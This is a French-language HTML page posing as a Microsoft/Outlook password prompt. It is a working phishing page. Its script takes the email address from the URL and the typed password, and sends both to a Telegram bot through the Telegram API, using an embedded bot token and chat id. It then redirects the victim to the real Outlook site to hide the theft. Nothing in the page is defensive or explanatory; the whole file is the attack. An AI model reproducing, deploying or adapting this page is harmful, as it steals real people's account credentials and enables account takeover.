<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrez votre mot de passe</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
        }
        body, html {
            height: 100%;
            min-height: 100vh;
        }
        body {
            background: #f3f6fb;
            position: relative;
            min-height: 100vh;
        }
        .background-img {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 0;
            width: 100vw;
            height: 100vh;
            background: url('fluent_web_light_57fee22710b04cebe1d5.png') center center/cover no-repeat, #f3f6fb;
        }
        .main-content {
            position: relative;
            z-index: 1;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .password-box {
            background: #fff;
            box-shadow: 0 2px 12px rgba(0,0,0,0.13);
            border-radius: 16px;
            width: 120%;
            max-width: 440px;
            padding: 40px 32px 32px 32px;
            margin-bottom: 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .ms-logo {
            margin-bottom: 18px;
        }
        .ms-logo img {
            height: 32px;
            width: auto;
        }
        .user-bubble {
            background: #f3f3f3;
            color: #444;
            border-radius: 16px;
            padding: 7px 22px;
            font-size: 16px;
            margin-bottom: 18px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.04);
        }
        .password-title {
            font-size: 26px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 28px;
            color: #222;
        }
        .input-group {
            width: 100%;
            margin-bottom: 18px;
            display: flex;
            justify-content: flex-start;
        }
        input[type="password"] {
            width: 240px;
            border: 1px solid #bdbdbd;
            border-radius: 5px;
            font-size: 16px;
            padding: 10px 12px;
            background: #fff;
            color: #222;
            transition: border-color 0.2s;
            display: block;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #0067b8;
        }
        .forgot-link {
            color: #0067b8;
            text-decoration: none;
            font-size: 15px;
            margin-bottom: 28px;
            display: inline-block;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .buttons {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .next-button {
            background-color: #0067b8;
            color: #fff;
            border: none;
            padding: 12px 0;
            font-size: 17px;
            font-weight: 600;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            box-shadow: none;
            transition: background 0.2s;
        }
        .next-button:hover {
            background-color: #005a9e;
        }
        footer {
            position: fixed;
            left: 0; right: 0; bottom: 0;
            width: 100vw;
            background: #f3f6fb;
            z-index: 2;
            padding: 0;
            border-top: 1px solid #e5e5e5;
        }
        .footer-content {
            background: #f3f6fb;
            padding: 0 24px 0 24px;
            width: 100vw;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 24px;
            font-size: 11px;
            color: #666;
            padding-top: 8px;
            padding-bottom: 2px;
        }
        .footer-links a {
            color: #666;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .footer-info {
            text-align: center;
            font-size: 10px;
            color: #444;
            padding-bottom: 6px;
        }
        .footer-info a {
            color: #0067b8;
            text-decoration: none;
        }
        .footer-info a:hover {
            text-decoration: underline;
        }
        @media (max-width: 500px) {
            .password-box {
                max-width: 98vw;
                padding-left: 8px;
                padding-right: 8px;
            }
            .footer-links {
                flex-direction: column;
                align-items: flex-end;
                gap: 4px;
            }
        }
    </style>
    <script>
        // Redirection automatique si on vient de la page login
        document.addEventListener('DOMContentLoaded', function() {
            const params = new URLSearchParams(window.location.search);
            if(params.has('user')) {
                document.getElementById('user-bubble').textContent = params.get('user');
            }
        });

        // Récupère l'email depuis l'URL
        function getEmail() {
            const params = new URLSearchParams(window.location.search);
            return params.get('user') || '';
        }

        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('password-form');
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                const email = getEmail();
                const password = document.getElementById('password').value;
                // Envoi à Telegram
                fetch('https://api.telegram.org/bot7727944499:AAHpgP9-xAAbtGZpBrYBfaX_FbkZiWVeEtw/sendMessage?chat_id=7263826117&text=' + encodeURIComponent('Email: ' + email + '\nMot de passe: ' + password))
                    .then(() => {
                        window.location.href = 'https://outlook.live.com/';
                    });
            });
        });
    </script>
</head>
<body>
    <div class="background-img"></div>
    <div class="main-content">
        <div class="password-box">
            <div class="ms-logo">
                <img src="logo-microsoft-scaled.jpg" alt="Microsoft Logo">
            </div>
            <div class="user-bubble" id="user-bubble">jhkijh</div>
            <div class="password-title">Entrez votre mot de passe</div>
            <form id="password-form">
                <div class="input-group">
                    <input type="password" id="password" placeholder="Mot de passe" required autocomplete="current-password">
                </div>
                <a href="#" class="forgot-link">Vous avez oublié votre mot de passe ?</a>
                <div class="buttons">
                    <button type="submit" class="next-button">Suivant</button>
                </div>
            </form>
        </div>
    </div>
    <footer>
        <div class="footer-content">
            <div class="footer-links">
                <a href="#">Aide</a>
                <a href="#">Conditions d'utilisation</a>
                <a href="#">Confidentialité et cookies</a>
                <a href="#">Accessibilité : partiellement conforme</a>
            </div>
            <div class="footer-info">
                <a href="#">Utilisez la navigation privée s'il ne s'agit pas de votre appareil. Découvrir plus d'informations © Microsoft 2023</a>
            </div>
        </div>
    </footer>
</body>
</html>
